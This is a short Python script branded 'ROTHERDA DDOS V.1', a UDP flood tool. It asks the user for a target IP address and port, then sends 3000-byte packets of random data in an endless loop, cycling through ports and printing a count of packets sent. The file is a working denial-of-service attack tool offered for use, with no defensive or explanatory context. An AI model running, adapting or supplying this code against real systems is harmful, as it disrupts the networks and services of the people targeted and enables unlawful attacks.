#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import os
import time
import socket
import random
import colorama
from colorama import Fore, Back, Style, init
from datetime import datetime

from colorama.ansi import Fore
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3000)
os.system("clear")
print(Fore.RED)
banner = """
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

     ROTHERDA DDOS V.1

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
"""
print(banner)
print(Style.RESET_ALL)
ip = raw_input("Target Ip => ")
port = input("Target Port => ")
os.system("clear")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print(Fore.BLUE)
     print("------------------------------------------------------------------------------------")
     print(" Sended Packets => %s \n Ip Address =>  %s \n Connection => :%s"%(sent,ip,port))
     print("------------------------------------------------------------------------------------")
     print(Style.RESET_ALL)
     if port == 65534:
        port = 1
